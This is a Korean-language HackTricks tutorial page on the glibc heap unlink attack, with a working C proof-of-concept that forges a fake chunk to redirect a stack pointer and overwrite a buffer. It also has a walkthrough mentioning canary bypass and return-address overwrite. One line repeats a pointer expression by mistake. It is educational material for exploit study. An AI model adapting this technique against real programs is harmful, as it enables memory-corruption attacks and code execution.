# Unlink Attack

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>에서 <strong>AWS 해킹을 처음부터 전문가까지 배우세요</strong>!</summary>

다른 방법으로 HackTricks를 지원하는 방법:

- **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하고 싶다면 [**구독 요금제**](https://github.com/sponsors/carlospolop)를 확인하세요!
- [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구매하세요
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
- 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 **팔로우**하세요.
- **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 귀하의 해킹 기술을 공유하세요.

</details>

## 기본 정보

이 공격이 발견될 당시 대부분 WWW (Write What Where)를 허용했지만, 일부 **검사가 추가**되어 공격의 새 버전이 더 흥미롭고 더 복잡하며 **쓸모없는** 것으로 만들어졌습니다.

### 코드 예시:

<details>

<summary>코드</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

### 목표

* 스택 내의 청크를 가리키는 포인터를 수정하여 스택 내용을 변경할 수 있도록 함

### 요구 사항

* 일부 메모리(예: 스택)에서 제어를 얻어 일부 속성에 값 할당을 통해 몇 개의 청크를 생성할 수 있어야 함
* 가짜 청크의 포인터를 설정하기 위해 스택 누출 필요

### 공격

* 두 개의 청크가 있음 (chunk1 및 chunk2)
* 공격자는 chunk1의 내용과 chunk2의 헤더를 제어함
* chunk1에서 공격자는 가짜 청크의 구조를 생성함:
  * 보호 기능을 우회하기 위해 `size` 필드가 올바른지 확인하여 `corrupted size vs. prev_size while consolidating` 오류를 피함
  * 가짜 청크의 `fd` 및 `bk` 필드가 chunk1 포인터가 저장된 위치를 가리키도록 만듦(-3 및 -2의 오프셋으로) 따라서 `fake_chunk->fd->bk` 및 `fake_chunk->bk->fd`가 실제 chunk1 주소가 있는 메모리(스택) 위치를 가리키도록 함

* chunk2의 헤더가 수정되어 이전 청크가 사용되지 않았음을 나타내고 가짜 청크의 크기가 포함된 크기임을 나타냄
* 두 번째 청크가 해제되면 가짜 청크가 연결 해제됨:
  * `fake_chunk->fd->bk` = `fake_chunk->bk`
  * `fake_chunk->bk->fd` = `fake_chunk->fd`
* 이전에 `fake_chunk->fd->bk` 및 `fake_chunk->fd->bk`가 동일한 위치를 가리키도록 만들어졌으므로(스택에 `chunk1`이 저장된 위치), 유효한 연결된 목록이었음. **두 위치가 동일한 위치를 가리키고 있기 때문에** 마지막 것만(`fake_chunk->bk->fd = fake_chunk->fd`) **적용**됨.
* 이로 인해 **스택 내 청크1을 가리키는 포인터가 스택 내에서 3 주소 전에 저장된 주소(또는 바이트)로 덮어씌워짐**.
* 따라서, 공격자가 다시 chunk1의 내용을 제어할 수 있다면, **스택 내부에 쓸 수 있어서 canary를 건너뛰고 반환 주소를 덮어쓰고 로컬 변수의 값을 및 포인터를 수정할 수 있음**. 또한 다시 스택에 저장된 chunk1 주소를 공격자가 다시 제어할 수 있는 다른 위치로 수정하면 어디든 쓸 수 있음.

## 참고 자료

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

다른 방법으로 HackTricks를 지원하는 방법:

* **회사를 HackTricks에서 광고하거나 PDF로 HackTricks를 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스왜그**](https://peass.creator-spring.com)를 구입하세요
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요, 당사의 독점 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **가입**하거나 **트위터** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)를 팔로우하세요.
* **HackTricks** 및 **HackTricks Cloud** github 저장소에 PR을 제출하여 **해킹 트릭을 공유**하세요.
